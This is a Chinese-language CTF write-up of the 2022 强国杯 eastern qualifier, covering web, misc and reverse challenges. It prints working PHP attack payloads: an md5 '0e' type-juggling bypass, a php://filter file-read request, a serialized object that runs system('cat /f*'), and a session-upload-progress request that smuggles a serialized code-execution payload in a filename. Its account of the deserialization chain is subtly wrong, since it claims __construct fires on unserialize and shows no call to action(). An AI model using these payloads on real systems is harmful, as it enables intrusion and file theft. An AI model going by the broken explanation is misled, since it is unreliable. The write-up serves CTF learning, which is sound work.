---
title: 2022 强国杯东部初赛 CTF WriteUp
contest: 2022 强国杯东部初赛
year: 2022
difficulty: medium
vuln_type: [sqli, lfi, rce, deserialize, web_unknown, misc_unknown, reverse]
tags: [强国杯, md5-0e, php://filter, LFI, eval, 反序列化逃逸, session-upload-progress, LFI-to-RCE, pyinstxtractor, 字节取反, hiencode]
attack_chain: ["md5_php: md5 弱类型比较 '0e215962017' 是 0e 开头, ?md5=0e215962017", "LFI: ?le.php?file=php://filter/convert.base64-encode/index/resource=flag", "反序列化: main.__construct 调 evil; evil.action eval($this->file) = system('cat /f*')", "phpti: session.upload.progress 触发 LFI, file 字段是 |O:5:admin 反序列化 payload", "Misc 平正开: 字节取反 (256-x) 还原 zip → hiencode CV 解码", "Re re2: pyinstxtractor 解包 exe + pyc 反编译 → 改 score=0 直接给 flag"]
key_payload: "O:4:\"main\":1:{s:11:\"\\0*\\0ClassObj\";O:4:\"evil\":1:{s:10:\"\\0evil\\0file\";s:18:\"system(\\\"cat /f*\\\");\";}"
one_liner: 强国杯东部 2022：md5 弱类型 + LFI + 反序列化逃逸 + session-upload LFI
lesson: PHP `__construct` 自动调用是反序列化入门；session.upload.progress LFI 是经典；0e md5 弱类型
quality: high
---

# 2022 强国杯东部 初赛 CTF WriteUp

原文 https://www.ctfiot.com/63358.html

## Web

### md5_php
```http
GET /?md5=0e215962017
```
- `0e215962017` md5 = `0e...` → 弱类型等于 0
- 再用 `php://filter` 读 flag：
```http
/le.php?file=php://filter/convert.base64-encode/index/resource=flag
```

### 反序列化
```php
<?php
class main {
    protected $ClassObj;
    function __construct() {
        $this->ClassObj = new evil();
    }
}
class evil {
    private $file = 'system("cat /f*");';
    function action() {
        eval($this->file);
    }
}
$a = new main();
echo urlencode(serialize($a));
```
- `__construct` 自动调 evil
- `evil.action` eval
- payload: `O:4:"main":1:{s:11:"\0*\0ClassObj";O:4:"evil":1:{s:10:"\0evil\0file";s:18:"system(\"cat /f*\");";}}`

### phpti (session.upload.progress LFI)
```http
POST /flag.php
Content-Type: multipart/form-data; boundary=---...

---------------------------
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
123
---------------------------
Content-Disposition: form-data; name="file"; filename="|O:5:\"admin\":1:{s:4:\"root\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}"
Content-Type: image/png
PNG
```
- `file` 字段是 `|反序列化 payload`
- LFI 触发 `include('|O:5:admin...')` → 反序列化执行

## Misc

### 平正开
```python
dd = open('12.zip', 'wb')
f1 = open('flag44c099db1.zip', 'rb')
for l in f1.read():
    if l == 0:
        dd.write(bytes([0x0]))
    else:
        dd.write(bytes([0x100 - l]))
dd.close()
# 然后 http://www.hiencode.com/cvencode.html 解码
```

## Re

### re2 (pyinstxtractor)
- 反编译 exe → 看到 pyc
- pyinstxtractor 解包
- 改 score = 0 → 直接给 flag

## 教学价值
- **md5 0e 弱类型** 是 CTF 入门
- **php://filter** LFI 经典
- **PHP `__construct` 链** 是反序列化基础
- **session.upload.progress LFI** 是 PHP 高级 web
- **字节取反** 是 misc 入门
- **pyinstxtractor** 是 Python reverse 基础

## 工具
- Burp
- php://filter
- pyinstxtractor
- hiencode 在线

## 关联
- 强国杯是国家级
- 同系列还有 #32 2024 FIC 取证
